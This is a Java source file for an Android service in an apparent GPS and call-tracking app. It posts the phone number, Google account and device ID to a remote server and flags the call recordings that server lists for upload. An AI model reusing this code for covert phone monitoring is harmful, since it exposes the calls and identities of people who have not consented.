package com.alcatrazstudios.apps.androidtracker.services;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.util.Log;

import com.alcatrazstudios.apps.androidtracker.Utilities.LoopjHttpClient;
import com.alcatrazstudios.apps.androidtracker.application.GpsTrackerApplication;
import com.alcatrazstudios.apps.androidtracker.model.CallRecordings;
import com.alcatrazstudios.apps.androidtracker.receiver.GpsTrackerConnectivityReceiver;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import cz.msebera.android.httpclient.Header;
import io.realm.Realm;
import io.realm.RealmResults;

public class FilesToUploadService extends Service {
    private static final String TAG="FilesToUploadService";
    private boolean serviceStarted=false;
    private Realm realm;
    private String phoneNo;
    private String googleAcct;
    private String deviceId;
    private String uploadWebsite;


    public FilesToUploadService() {
    }

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
        super.onCreate();
        realm = Realm.getDefaultInstance();
        SharedPreferences sharedPreferences = GpsTrackerApplication.getSharedPreferences();
        phoneNo = sharedPreferences.getString("phoneNo", "");
        googleAcct = sharedPreferences.getString("googleAcct", "");
        deviceId = sharedPreferences.getString("deviceId", "");
        uploadWebsite = sharedPreferences.getString("downloadFilesQuery", "http://oragps.com/recibir/disponibles.php");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (!serviceStarted){
            serviceStarted=true;
            try {
                boolean isConnected= GpsTrackerConnectivityReceiver.isConnected();
                if (isConnected) {
                    queryData();
                } else {
                    stopSelf();
                }
            } catch (Throwable thrError) {
                thrError.printStackTrace();
                Log.e(TAG,"Error sending data OnStartCommand:" + thrError.getMessage(),thrError);
                stopSelf();
            }
        }

        return START_NOT_STICKY;
    }


    private void queryData(){
        if (GpsTrackerConnectivityReceiver.isConnected()) {
            final RequestParams requestParams = new RequestParams();
            try {
                requestParams.add("googleAcct", googleAcct);
                requestParams.add("deviceId", deviceId);
                requestParams.add("phoneNo", phoneNo);
                LoopjHttpClient.post(uploadWebsite, requestParams, new AsyncHttpResponseHandler() {
                    @Override
                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                        try {
                            LoopjHttpClient.debugLoopJ(TAG, "getFilesToUpload - success", uploadWebsite, requestParams, responseBody, headers, statusCode, null);
                            String response=new String(responseBody).replace("(","").replace(")","").trim();
                            if (!response.isEmpty()) {
                                JSONArray jArray = new JSONArray(response);
                                List<String> files = new ArrayList<String>();
                                for (int index = 0; index < jArray.length(); index++) {
                                    JSONObject file = jArray.getJSONObject(index);
                                    String singleFile = file.getString("filename");
                                    files.add(singleFile);
                                }
                                if (files.size() > 0) {
                                    RealmResults<CallRecordings> callRecordings = realm.where(CallRecordings.class).in("fileName", files.toArray(new String[files.size()])).findAll();
                                    if (!callRecordings.isEmpty()) {
                                        Iterator<CallRecordings> iterator = callRecordings.iterator();
                                        realm.beginTransaction();
                                        while (iterator.hasNext()) {
                                            iterator.next().setSetToUpload(true);
                                        }
                                        realm.insertOrUpdate(callRecordings);
                                        realm.commitTransaction();
                                    }

                                }
                            }

                        } catch (JSONException e) {
                            Log.e(TAG,"There is an exception :"+e.getMessage(),e);
                            e.printStackTrace();
                        } catch (Throwable thrError) {
                            thrError.printStackTrace();
                            Log.e(TAG,"Error Loop On Success: " + thrError.getMessage(),thrError);
                        } finally {
                            stopSelf();
                        }
                    }

                    @Override
                    public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] errorResponse, Throwable e) {
                        try {
                            LoopjHttpClient.debugLoopJ(TAG, "getFilesToUpload - failure", uploadWebsite, requestParams, errorResponse, headers, statusCode, e);
                        } catch (Throwable thrError) {
                            thrError.printStackTrace();
                            Log.e(TAG,"Error getting data OnFailure:" + thrError.getMessage(),thrError);
                        } finally {
                            stopSelf();
                        }
                    }
                });

            } finally {
                Log.i(TAG,"finish queryData");
            }
        }

    }
}
